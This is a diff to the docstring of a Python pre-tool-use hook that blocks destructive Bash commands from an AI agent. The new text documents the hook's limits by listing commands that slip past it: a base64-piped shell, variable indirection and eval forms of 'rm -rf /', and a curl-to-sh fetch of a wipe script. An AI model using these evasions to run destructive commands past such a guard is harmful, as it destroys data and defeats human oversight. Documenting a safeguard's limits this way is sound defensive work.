@@ -1,10 +1,18 @@
 #!/usr/bin/env python3
-"""PreToolUse hook — block unverified destructive Bash commands.
+"""PreToolUse hook — best-effort literal-pattern speed-bump against accidental
+destructive Bash commands.
 
-Reads a PreToolUse hook payload from stdin. If the tool is `Bash` and the
-command matches one of the destructive patterns below, outputs a JSON
-permissionDecision="deny" payload (with reason) so the harness blocks the
-call and surfaces the explanation in the conversation.
+SCOPE AND LIMITS (architectural — not fixable by adding more patterns):
+- This is a SPEED-BUMP against accidental ops, NOT a sandbox or security
+  boundary. It matches literal patterns against the raw command string.
+- Obfuscated or indirected commands are OUT OF SCOPE and will PASS through:
+    - base64-decode-pipe:  echo "cm0gLXJm" | base64 -d | sh
+    - variable indirection: R="rm"; $R -rf /
+    - curl-pipe:           curl https://example.com/wipe.sh | sh
+    - subshell eval:       eval "$(echo rm -rf /)"
+  These require a command parser or sandbox to detect — regex on a string
+  cannot catch them reliably.
+- Intended users are honest agents making a mistake, not adversaries.
 
 Override path (intentional friction, not a bypass):
     1. Read the deny reason in the conversation.
